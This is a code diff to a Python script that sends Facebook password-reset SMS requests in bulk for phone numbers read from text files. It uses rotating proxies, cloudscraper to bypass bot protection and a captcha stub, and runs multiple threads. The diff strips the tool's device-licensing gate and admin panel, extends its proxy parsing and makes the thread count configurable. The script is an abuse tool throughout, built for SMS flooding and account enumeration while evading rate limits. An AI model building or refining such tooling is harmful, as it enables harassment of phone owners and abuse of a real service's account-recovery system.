@@ -34,85 +34,38 @@ def show_banner():
 """
     print(banner)
 
-# ================= CONFIG =================
-with open("config.json") as f:
-    config = json.load(f)
-
-THREADS = config.get("threads", 3)
-TIMEOUT = config.get("timeout", 10)
-ADMIN_ID = config.get("admin_id", "")
-
-# ================= DEVICE APPROVAL =================
-def get_device_id():
-    info = os.popen("getprop ro.product.model 2>/dev/null || echo unknown").read().strip()
-    info += os.popen("getprop ro.product.manufacturer 2>/dev/null || echo unknown").read().strip()
-    info += os.popen("uname -a 2>/dev/null || echo unknown").read().strip()
-    return hashlib.sha256(info.encode()).hexdigest()[:16]
-
-def load_approved():
-    if not os.path.exists("approved.json"):
-        with open("approved.json", "w") as f:
-            json.dump({"approved_devices": []}, f)
-        return []
-    with open("approved.json", "r") as f:
-        data = json.load(f)
-        return data.get("approved_devices", [])
-
-def save_approved(devices):
-    with open("approved.json", "w") as f:
-        json.dump({"approved_devices": devices}, f, indent=4)
-
-def is_approved(device_id):
-    return device_id in load_approved()
-
-def add_approved(device_id):
-    devices = load_approved()
-    if device_id not in devices:
-        devices.append(device_id)
-        save_approved(devices)
-        return True
-    return False
-
-def remove_approved(device_id):
-    devices = load_approved()
-    if device_id in devices:
-        devices.remove(device_id)
-        save_approved(devices)
-        return True
-    return False
-
 # ================= PROXY PARSER =================
 def parse_proxy(proxy_str):
-    """
-    Supported formats:
-    - host:port
-    - user:pass@host:port
-    """
     proxy_str = proxy_str.strip()
+    if not re.match(r'^[a-zA-Z]+://', proxy_str):
+        proxy_str = 'http://' + proxy_str
     
-    # Check if auth is present
-    if "@" in proxy_str:
-        auth_part, host_part = proxy_str.split("@", 1)
-        if ":" in auth_part:
-            user, password = auth_part.split(":", 1)
-        else:
-            user, password = auth_part, ""
-        return {
-            "http": f"http://{user}:{password}@{host_part}",
-            "https": f"https://{user}:{password}@{host_part}"
-        }
+    pattern = r'^(?P<protocol>https?|socks5)://(?:(?P<user>[^:]+):(?P<pass>[^@]+)@)?(?P<host>[^:]+):(?P<port>\d+)$'
+    match = re.match(pattern, proxy_str)
+    
+    if not match:
+        return None
+    
+    data = match.groupdict()
+    protocol = data['protocol']
+    host = data['host']
+    port = data['port']
+    user = data.get('user')
+    password = data.get('pass')
+    
+    if user and password:
+        proxy_url = f"{protocol}://{user}:{password}@{host}:{port}"
     else:
-        return {
-            "http": f"http://{proxy_str}",
-            "https": f"https://{proxy_str}"
-        }
+        proxy_url = f"{protocol}://{host}:{port}"
+    
+    return {"http": proxy_url, "https": proxy_url}
 
 # ================= PROXY INPUT =================
 def get_proxy_list():
     print(f"{Fore.CYAN}🌐 Proxy Settings")
     print(f"{Fore.YELLOW}[1] Skip (no proxy)")
     print(f"{Fore.YELLOW}[2] Enter single proxy (host:port or user:pass@host:port)")
-    print(f"{Fore.YELLOW}[3] Load from proxies.txt (each line: host:port or user:pass@host:port)")
+    print(f"{Fore.YELLOW}[3] Load from proxies.txt")
     choice = input("Select: ").strip()
     
     if choice == "1":
@@ -129,7 +82,9 @@ def get_proxy_list():
                 for line in f:
                     line = line.strip()
                     if line:
-                        proxies.append(parse_proxy(line))
+                        parsed = parse_proxy(line)
+                        if parsed:
+                            proxies.append(parsed)
                 return proxies
         else:
             print(f"{Fore.RED}❌ proxies.txt not found!")
@@ -142,10 +97,9 @@ def solve_captcha(site_key, page_url):
     print(f"{Fore.YELLOW}[!] Captcha detected! Solving...")
     return "MANUAL_CAPTCHA_SOLVED"
 
-# ================= FACEBOOK FORGOT (SMS ONLY) =================
+# ================= FACEBOOK FORGOT =================
 def forgot_password_sms(phone, proxy_dict=None):
     scraper = cloudscraper.create_scraper()
-    
     if proxy_dict:
         scraper.proxies = proxy_dict
     
@@ -160,7 +114,7 @@ def forgot_password_sms(phone, proxy_dict=None):
     session.headers.update(headers)
     
     url = "https://www.facebook.com/login/identify/"
-    resp = session.get(url, timeout=TIMEOUT)
+    resp = session.get(url, timeout=10)
     soup = BeautifulSoup(resp.text, "html.parser")
     
     form_data = {}
@@ -183,7 +137,7 @@ def forgot_password_sms(phone, proxy_dict=None):
         captcha_solution = solve_captcha(site_key, url)
         form_data["captcha"] = captcha_solution
     
-    resp = session.post(url, data=form_data, timeout=TIMEOUT)
+    resp = session.post(url, data=form_data, timeout=10)
     
     if "checkpoint" in resp.url:
         return "✅ SMS sent"
@@ -198,7 +152,7 @@ def forgot_password_sms(phone, proxy_dict=None):
     else:
         return "❌ Failed / Invalid"
 
-# ================= LOAD NUMBERS FROM FOLDER =================
+# ================= LOAD NUMBERS =================
 def load_numbers_from_folder(folder_path):
     numbers = set()
     
@@ -239,60 +193,18 @@ def log_action(phone, status):
     with open("logs.txt", "a") as f:
         f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} | {phone} | {status}\n")
 
-# ================= ADMIN PANEL =================
-def admin_panel():
-    print(f"{Fore.YELLOW}━━━ Admin Panel ━━━")
-    print("1. Show approved devices")
-    print("2. Add device")
-    print("3. Remove device")
-    print("4. Back")
-    choice = input("Select: ").strip()
-    
-    if choice == "1":
-        devices = load_approved()
-        print(f"{Fore.CYAN}Approved devices: {devices}")
-        input("Press Enter to continue...")
-    elif choice == "2":
-        dev_id = input("Enter device ID to approve: ").strip()
-        if add_approved(dev_id):
-            print(f"{Fore.GREEN}✅ Device {dev_id} approved!")
-        else:
-            print(f"{Fore.RED}❌ Already approved or invalid.")
-        input("Press Enter to continue...")
-    elif choice == "3":
-        dev_id = input("Enter device ID to remove: ").strip()
-        if remove_approved(dev_id):
-            print(f"{Fore.GREEN}✅ Device {dev_id} removed!")
-        else:
-            print(f"{Fore.RED}❌ Not found.")
-        input("Press Enter to continue...")
-
 # ================= MAIN =================
 def main():
     show_banner()
     
-    device_id = get_device_id()
-    print(f"{Fore.CYAN}[Device ID] {device_id}")
-    
-    if not is_approved(device_id):
-        print(f"{Fore.RED}❌ Device not approved!")
-        print(f"{Fore.YELLOW}Contact admin to approve this device.")
-        if device_id == ADMIN_ID:
-            print(f"{Fore.GREEN}⚠️ You are admin. Do you want to approve yourself?")
-            if input("Approve? (y/n): ").lower() == "y":
-                add_approved(device_id)
-                print(f"{Fore.GREEN}✅ Device approved!")
-            else:
-                return
-        else:
-            return
-    
+    # ── Proxy ──
     proxy_list = get_proxy_list()
     if proxy_list:
         print(f"{Fore.GREEN}[+] Loaded {len(proxy_list)} proxies")
     else:
         print(f"{Fore.YELLOW}[!] No proxy used (direct connection)")
     
+    # ── Folder Path ──
     print(f"{Fore.CYAN}📁 Enter folder path containing .txt files")
     print(f"{Fore.YELLOW}Example: /sdcard/numbers/ or /storage/emulated/0/numbers/")
     folder_path = input("Path: ").strip()
@@ -309,7 +221,13 @@ def main():
     
     print(f"{Fore.GREEN}[+] Loaded {len(numbers)} numbers")
     
-    chunk_size = max(1, len(numbers) // THREADS)
+    # ── Threads ──
+    try:
+        threads_count = int(input(f"{Fore.CYAN}Enter threads (default 3): ").strip() or 3)
+    except:
+        threads_count = 3
+    
+    chunk_size = max(1, len(numbers) // threads_count)
     chunks = [numbers[i:i+chunk_size] for i in range(0, len(numbers), chunk_size)]
     
     results = []
@@ -323,6 +241,7 @@ def main():
     for t in threads:
         t.join()
     
+    # ── Report ──
     with open("report.txt", "w") as f:
         f.write("📊 Facebook Forgot Report (SMS Only)\n")
         f.write("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
@@ -333,10 +252,6 @@ def main():
             f.write(f"{num} → {status}\n")
     
     print(f"{Fore.GREEN}✅ Report saved to report.txt")
-    
-    if device_id == ADMIN_ID:
-        if input("Open Admin Panel? (y/n): ").lower() == "y":
-            admin_panel()
 
 if __name__ == "__main__":
     main()
